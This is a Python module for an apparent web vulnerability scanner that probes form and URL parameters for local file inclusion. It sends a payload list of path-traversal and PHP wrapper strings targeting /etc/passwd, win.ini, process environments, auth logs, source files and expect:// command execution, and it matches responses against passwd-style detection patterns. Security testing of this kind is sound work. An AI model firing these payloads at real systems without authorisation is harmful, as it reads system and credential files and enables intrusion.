"""
Local File Inclusion (LFI) Scanner Module
"""

import re
import requests
from scanner_modules.url_utils import with_param
from urllib.parse import urlparse, urljoin, quote, parse_qs
import time

class LFIScanner:
    def __init__(self, base_url, session):
        self.base_url = base_url.rstrip('/')
        self.domain = urlparse(base_url).netloc
        self.session = session
        self.findings = []
        
        # LFI payloads
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%252f..%252f..%252f..%252fetc%252fpasswd",
            "/etc/passwd",
            "C:\\windows\\win.ini",
            "C:/windows/win.ini",
            "../../../../windows/win.ini",
            "../../../../boot.ini",
            "../../../../proc/self/environ",
            "../../../../var/log/auth.log",
            "../../../../var/log/messages",
            "../../../../var/log/syslog",
            "php://filter/convert.base64-encode/resource=index.php",
            "php://filter/read=convert.base64-encode/resource=index.php",
            "file:///etc/passwd",
            "file:///c:/windows/win.ini",
            "expect://ls",
            "input:///etc/passwd",
            "data://text/plain,<?php phpinfo(); ?>",
        ]
        
        # Detection patterns
        self.detection_patterns = [
            r"root:.*:0:0:",
            r"daemon:.*:/dev/null",
            r"bin:.*:/bin",
            r"\[boot loader\]",
            r"\[operating systems\]",
            r"for 16-bit app support",
            r"PHP Version [0-9]",
            r"Systemadmin",
            r"uid=.*gid=",
        ]

    def test_parameter(self, url, param_name, method='GET'):
        """Test parameter for LFI vulnerability"""
        findings = []
        
        try:
            # Get base response
            if method == 'GET':
                base_response = self.session.get(url, timeout=10)
            else:
                base_response = self.session.post(url, data={}, timeout=10)
            base_length = len(base_response.text)
        except:
            return findings
        
        for payload in self.lfi_payloads:
            try:
                if method == 'GET':
                    test_url = url.replace(f"{param_name}=", f"{param_name}={quote(payload)}")
                    response = self.session.get(test_url, timeout=10)
                else:
                    response = self.session.post(url, data={param_name: payload}, timeout=10)
                
                # Check for LFI patterns
                for pattern in self.detection_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        findings.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'High',
                            'title': f'LFI vulnerability in parameter {param_name}',
                            'description': f'Local File Inclusion vulnerability detected in parameter "{param_name}". Server-side file inclusion is possible.',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'evidence': f'Pattern matched: {pattern}',
                            'remediation': 'Avoid passing user input directly to file inclusion functions. Use whitelisting for allowed files. Implement proper input validation and sanitization.'
                        })
                        return findings  # Stop testing this parameter
                
                # Check for significant response differences
                if abs(len(response.text) - base_length) > 500:
                    if 'root:' in response.text or 'boot.ini' in response.text.lower():
                        findings.append({
                            'type': 'Local File Inclusion (LFI)',
                            'severity': 'Critical',
                            'title': f'LFI with file read vulnerability',
                            'description': f'Parameter "{param_name}" allows reading arbitrary files from the server via LFI.',
                            'url': url,
                            'parameter': param_name,
                            'payload': payload,
                            'remediation': 'Never include user input in file paths. Use an allow-list of authorized files. Ensure proper access controls.'
                        })
                        return findings  # Stop testing this parameter
                        
            except Exception as e:
                continue
        
        return findings

    def scan(self):
        """Main scanning function"""
        try:
            # Get initial page
            response = self.session.get(self.base_url, timeout=10)
            
            from bs4 import BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find all forms
            forms = soup.find_all('form')
            
            for form in forms:
                action = form.get('action', '')
                method = form.get('method', 'get').upper()
                
                if action:
                    if action.startswith('http'):
                        form_url = action
                    else:
                        form_url = urljoin(self.base_url, action)
                else:
                    form_url = self.base_url
                
                inputs = form.find_all(['input', 'textarea', 'select'])
                
                for input_field in inputs:
                    param_name = input_field.get('name')
                    if param_name:
                        results = self.test_parameter(form_url, param_name, method)
                        self.findings.extend(results)
            
            # Test URL parameters
            parsed = urlparse(self.base_url)
            if parsed.query:
                params = parse_qs(parsed.query)
                for param_name in params.keys():
                    results = self.test_parameter(self.base_url, param_name)
                    self.findings.extend(results)
            
            # Test common LFI parameters
            common_params = ['file', 'path', 'page', 'load', 'include', 'dir', 'cat', 'document', 'template']
            for param in common_params:
                test_url = with_param(self.base_url, param, "index.php")
                results = self.test_parameter(test_url, param)
                self.findings.extend(results)
            
        except Exception as e:
            print(f"LFI scanning error: {e}")
        
        return self.findings
